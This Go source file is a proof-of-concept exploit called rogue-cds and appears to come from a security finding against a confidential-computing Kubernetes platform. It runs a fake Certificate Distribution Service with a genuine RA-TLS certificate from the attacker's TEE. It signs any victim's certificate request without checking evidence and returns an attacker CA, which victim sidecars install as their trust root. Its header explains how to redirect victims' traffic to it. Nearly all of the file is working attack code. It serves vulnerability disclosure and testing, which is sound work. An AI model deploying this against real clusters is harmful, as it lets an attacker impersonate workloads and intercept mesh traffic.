// Command rogue-cds is a PoC for the CDS bootstrap-identity issue
// (docs/security/RT-001-cds-bootstrap-identity.md): a fake Certificate
// Distribution Service that any workload's get-cert sidecar will accept as
// the real CDS because the injected sidecars never receive
// --cds-measurements, and the bootstrap client installs whatever CA bundle
// the issuance response carries.
//
// The serving certificate is a genuine self-signed RA-TLS certificate: the
// hardware attestation is real (produced by the TEE this process runs in via
// its local attestation-api), it just belongs to the attacker, not to CDS.
// No c8s credentials, allowlist entry, or cluster RBAC are required.
//
// Usage (inside any TEE that can reach an attestation-api — a TDX TD, an SNP
// guest, or a kata pod running any allowlisted image):
//
//	rogue-cds --addr 0.0.0.0:8443 \
//	  --platform tdx \
//	  --attestation-api-url http://127.0.0.1:8400
//
// Then steer victims' CDS traffic to it (host DNAT of the CDS Service
// ClusterIP, a shadow EndpointSlice, or DNS) — see README.md.
package main

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"flag"
	"log/slog"
	"math/big"
	"net/http"
	"os"
	"time"

	"github.com/confidential-dot-ai/c8s/pkg/attestclient"
	"github.com/confidential-dot-ai/c8s/pkg/certutil"
	"github.com/confidential-dot-ai/c8s/pkg/ratls"
	"github.com/confidential-dot-ai/c8s/pkg/types"
)

type rogueCDS struct {
	caKey  *ecdsa.PrivateKey
	caCert *x509.Certificate
	caPEM  []byte
}

func main() {
	var (
		addr              = flag.String("addr", "0.0.0.0:8443", "listen address")
		platform          = flag.String("platform", "tdx", "TEE platform for the RA-TLS serving cert (tdx|snp|az-snp|az-tdx|gcp-snp)")
		attestationAPIURL = flag.String("attestation-api-url", "http://127.0.0.1:8400", "attestation-api the fake uses to mint its own genuine evidence")
		caCN              = flag.String("ca-cn", "c8s Mesh CA (attacker)", "CN of the attacker mesh CA")
	)
	flag.Parse()
	slog.Info("rogue-cds starting", "addr", *addr, "platform", *platform)

	f, err := newRogueCDS(*caCN)
	if err != nil {
		slog.Error("CA setup failed", "error", err)
		os.Exit(1)
	}

	// Genuine RA-TLS serving cert: real hardware evidence, attacker key.
	// Identical provisioning path to the real CDS (internal/cmds/cds/run.go).
	attestFunc := attestclient.MakeSNPRATLSAttestFunc(attestclient.NewClient(""), *attestationAPIURL)
	tlsCfg, certMgr, err := ratls.NewServerTLSConfig(&ratls.ServerConfig{
		Platform:   ratls.NormalizePlatform(*platform),
		AttestFunc: attestFunc,
		CertTTL:    time.Hour,
		Logger:     slog.Default(),
	})
	if err != nil {
		slog.Error("RA-TLS config failed", "error", err)
		os.Exit(1)
	}
	warmupCtx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	if err := certMgr.WarmUp(warmupCtx); err != nil {
		cancel()
		slog.Error("RA-TLS warm-up failed (need a live TEE + attestation-api?)", "error", err)
		os.Exit(1)
	}
	cancel()
	slog.Info("genuine TEE evidence bound to attacker serving key — ready to impersonate CDS")

	mux := http.NewServeMux()
	mux.HandleFunc("POST /authenticate", f.handleAuthenticate)
	mux.HandleFunc("POST /attest", f.handleAttest)
	mux.HandleFunc("GET /ca", f.handleCA)
	mux.HandleFunc("GET /healthz", func(w http.ResponseWriter, _ *http.Request) { w.WriteHeader(http.StatusOK) })
	mux.HandleFunc("GET /readyz", func(w http.ResponseWriter, _ *http.Request) { w.WriteHeader(http.StatusOK) })

	srv := &http.Server{Addr: *addr, Handler: mux, TLSConfig: tlsCfg}
	if err := srv.ListenAndServeTLS("", ""); err != http.ErrServerClosed {
		slog.Error("serve failed", "error", err)
		os.Exit(1)
	}
}

// newRogueCDS mints the attacker's own "mesh CA". Victim get-cert sidecars
// install this as their root of trust from the /attest response.
func newRogueCDS(cn string) (*rogueCDS, error) {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, err
	}
	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	tmpl := &x509.Certificate{
		SerialNumber:          serial,
		Subject:               pkix.Name{CommonName: cn},
		NotBefore:             time.Now().Add(-time.Hour),
		NotAfter:              time.Now().Add(24 * time.Hour),
		IsCA:                  true,
		KeyUsage:              x509.KeyUsageCertSign | x509.KeyUsageDigitalSignature,
		BasicConstraintsValid: true,
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		return nil, err
	}
	cert, err := x509.ParseCertificate(der)
	if err != nil {
		return nil, err
	}
	return &rogueCDS{caKey: key, caCert: cert, caPEM: certutil.EncodeCertPEM(der)}, nil
}

// handleAuthenticate mints a throwaway challenge. The fake never validates it
// on /attest; get-cert only needs well-formed base64.
func (f *rogueCDS) handleAuthenticate(w http.ResponseWriter, _ *http.Request) {
	nonce := make([]byte, 32)
	_, _ = rand.Read(nonce)
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(types.ChallengeResponse{
		Challenge: base64.StdEncoding.EncodeToString(nonce),
	})
}

// handleAttest signs the victim's CSR with the ATTACKER CA — no evidence
// verification of any kind — and returns leaf || attacker-CA. get-cert
// installs certs[1:] as the mesh trust root
// (pkg/ratls/cdsclient/client.go RequestCert).
func (f *rogueCDS) handleAttest(w http.ResponseWriter, r *http.Request) {
	var req types.AttestRequestBody
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request", http.StatusUnprocessableEntity)
		return
	}
	block, _ := pem.Decode([]byte(req.CSR))
	if block == nil {
		http.Error(w, "bad CSR", http.StatusBadRequest)
		return
	}
	csr, err := x509.ParseCertificateRequest(block.Bytes)
	if err != nil {
		http.Error(w, "bad CSR", http.StatusBadRequest)
		return
	}
	slog.Info("captured bootstrap request",
		"cn", csr.Subject.CommonName, "dns_sans", csr.DNSNames,
		"evidence_platform", req.Evidence.Platform, "remote", r.RemoteAddr)

	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	leaf := &x509.Certificate{
		SerialNumber: serial,
		Subject:      csr.Subject,
		DNSNames:     csr.DNSNames,
		IPAddresses:  csr.IPAddresses,
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(24 * time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth, x509.ExtKeyUsageClientAuth},
	}
	der, err := x509.CreateCertificate(rand.Reader, leaf, f.caCert, csr.PublicKey, f.caKey)
	if err != nil {
		http.Error(w, "sign failed", http.StatusInternalServerError)
		return
	}
	slog.Info("issued attacker-CA leaf — victim will install attacker CA as mesh root",
		"cn", csr.Subject.CommonName)
	w.Header().Set("Content-Type", "application/x-pem-file")
	w.Write(append(certutil.EncodeCertPEM(der), f.caPEM...))
}

// handleCA serves the attacker CA bundle for the unauthenticated /ca poll.
func (f *rogueCDS) handleCA(w http.ResponseWriter, _ *http.Request) {
	w.Header().Set("Content-Type", "application/x-pem-file")
	w.Write(f.caPEM)
}
